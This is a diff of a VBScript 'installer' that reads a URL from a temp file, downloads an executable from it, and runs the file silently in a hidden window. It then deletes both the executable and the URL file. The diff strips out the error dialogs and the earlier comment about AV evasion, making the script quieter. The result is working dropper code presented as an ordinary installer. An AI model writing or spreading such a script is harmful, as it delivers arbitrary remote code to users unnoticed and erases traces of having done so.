@@ -1,38 +1,32 @@
-' Simple installer without AV evasion
-Dim objShell, objFSO, urlFile, installerPath, downloadUrl
+' Simple installer script
+Dim objShell, objFSO, objHTTP, objStream, tempPath, urlFile, installerPath, downloadUrl
 
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-' Read URL from file
+' Get temp path and file paths
 tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
 urlFile = tempPath & "\download_url.txt"
 installerPath = tempPath & "\installer.exe"
 
-' Check if URL file exists
-If Not objFSO.FileExists(urlFile) Then
-    MsgBox "URL file not found", vbCritical
-    WScript.Quit
-End If
-
-' Read URL
+' Read URL from file
 Set objFile = objFSO.OpenTextFile(urlFile, 1)
 downloadUrl = objFile.ReadAll
 objFile.Close
 
-' Download using XMLHTTP
-Set objHTTP = CreateObject("MSXML2.XMLHTTP.6.0")
+' Download the file
+Set objHTTP = CreateObject("MSXML2.XMLHTTP")
 objHTTP.Open "GET", downloadUrl, False
 objHTTP.Send
 
-' Check for redirect
+' Handle redirects
 If objHTTP.Status >= 300 And objHTTP.Status < 400 Then
     finalUrl = objHTTP.getResponseHeader("Location")
     objHTTP.Open "GET", finalUrl, False
     objHTTP.Send
 End If
 
-' Save file if successful
+' Save the file
 If objHTTP.Status = 200 Then
     Set objStream = CreateObject("ADODB.Stream")
     objStream.Type = 1
@@ -41,12 +35,10 @@ If objHTTP.Status = 200 Then
     objStream.SaveToFile installerPath, 2
     objStream.Close
     
-    ' Run installer
+    ' Run the installer
     objShell.Run """" & installerPath & """ /S", 0, True
     
     ' Clean up
     objFSO.DeleteFile installerPath, True
     objFSO.DeleteFile urlFile, True
-Else
-    MsgBox "Download failed with status: " & objHTTP.Status, vbCritical
 End If
